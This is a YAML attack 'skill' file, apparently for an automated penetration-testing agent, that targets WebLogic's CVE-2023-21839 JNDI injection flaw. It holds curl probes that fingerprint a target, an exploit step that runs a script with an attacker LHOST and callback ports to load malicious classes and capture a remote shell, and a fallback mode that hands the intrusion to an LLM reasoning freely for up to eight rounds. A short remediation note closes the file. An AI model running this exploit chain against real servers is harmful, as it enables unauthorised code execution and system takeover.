# ═══════════════════════════════════════════════════════════
# WebLogic CVE-2023-21839 — T3/IIOP JNDI 注入 RCE
# ═══════════════════════════════════════════════════════════
skill_id: weblogic_jndi_rce
name: "WebLogic T3/IIOP JNDI 注入 RCE (CVE-2023-21839)"
category: web_rce
version: "1.0"

principle: |
  WebLogic 的 T3/IIOP 协议存在 JNDI 注入漏洞。
  通过 ForeignOpaqueReference 触发 JNDI lookup，
  连接攻击者的 LDAP/RMI 加载恶意类 → RCE。
  需要 LHOST 可被 WebLogic 回连。

match:
  rules:
    - fingerprint_contains: ["weblogic"]
    - fingerprint_contains: ["WebLogic"]
    - evidence_contains: ["weblogic"]
    - cve_matches: ["CVE-2023-21839"]

probes:
  - id: confirm_weblogic
    description: "确认 WebLogic Console + T3 协议"
    steps:
      - command: |
          code=$(curl -s -o /dev/null -w "%{http_code}" \
            "{ENDPOINT}/console/login/LoginForm.jsp" --max-time 10 2>/dev/null)
          echo "CONSOLE_STATUS:$code"
          if [ "$code" = "200" ] || [ "$code" = "302" ]; then
            echo "WEBLOGIC_CONFIRMED"
          fi
          resp=$(curl -s -D - {ENDPOINT}/ --max-time 10 2>/dev/null)
          if echo "$resp" | grep -qi "WebLogic\|Oracle"; then
            echo "WEBLOGIC_CONFIRMED"
          fi
        parse_rules:
          - if_contains: ["WEBLOGIC_CONFIRMED"]
            set: { weblogic_confirmed: true }

exploit_paths:
  - path_id: weblogic_script
    name: "weblogic_exploit.py JNDI 注入"
    priority: 1
    conditions:
      weblogic_confirmed: true
    steps:
      - id: run_exploit
        description: "T3 JNDI 注入 + JNDIExploit"
        publish_ports: [1389, 8888, 39878]
        command: |
          python3 /opt/weblogic_exploit.py {TARGET_IP} {TARGET_PORT} \
            --lhost "$LHOST" 2>&1
        timeout: 180
        success_criteria:
          stdout_contains_any: ["WEBLOGIC_RCE_CONFIRMED"]
        on_success: conclude_success
        on_fail: next_path
        evidence_capture:
          shell_type: "rce_weblogic_jndi"

  - path_id: llm_freeform
    name: "LLM 自由推理"
    priority: 99
    mode: react_freeform
    max_rounds: 8
    conditions:
      weblogic_confirmed: true

remediation: |
  1. 升级 WebLogic 至最新 CPU 补丁
  2. 禁用 T3 协议或限制访问
